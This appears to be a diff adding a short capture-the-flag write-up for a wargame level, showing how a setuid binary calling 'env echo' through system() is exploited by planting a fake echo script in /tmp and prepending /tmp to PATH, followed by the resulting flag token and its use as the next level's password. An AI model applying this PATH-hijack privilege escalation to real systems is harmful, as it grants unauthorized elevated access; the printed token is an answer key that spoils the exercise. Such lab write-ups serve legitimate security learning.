@@ -1,0 +1,51 @@
+# 03
+
+- inspect
+  - available actions - `file` `readelf` `strings` ：❌ `ltrace` ✅ 
+```b
+> ls -l
+-rwsr-sr-x 1 flag03 level03 8627 level03
+   ^  ^ setuid bit & setgid bit are set
+  👉 when the binary is exec functions called inside it
+  are called under same level of permission
+```
+```b
+> ltrace ./level03
+  👉 we can see the `s` bit in action
+
+### output
+getegid()                                           = 2003
+geteuid()                                           = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+system("/usr/bin/env echo Exploit me" ...
+
+### observations
+  👉 getegid & geteuid return a effective group/user ID ie. 2003
+  👉 setresgid & setresuid set Real/Effective/Saved ID to ensure
+  that the process maintains privileges
+  👉 `/usr/bin/env echo` uses a vulnerable relative path
+  since ./level03 has high privileges,
+  we can fake a false echo to run getflag inside ./level03
+```
+```b
+> whereis getflag
+getflag: /bin/getflag
+```
+
+- solution
+
+```b
+> echo -e "#\!/bin/bash\n/bin/getflag" > /tmp/echo
+> chmod +x /tmp/echo
+> export PATH=/tmp:$PATH
+> ./level03
+# qi0maab88jeaj46qoumi7maus
+```
+
+# 03 - token
+
+```b
+> su level04
+> Password: qi0maab88jeaj46qoumi7maus
+```
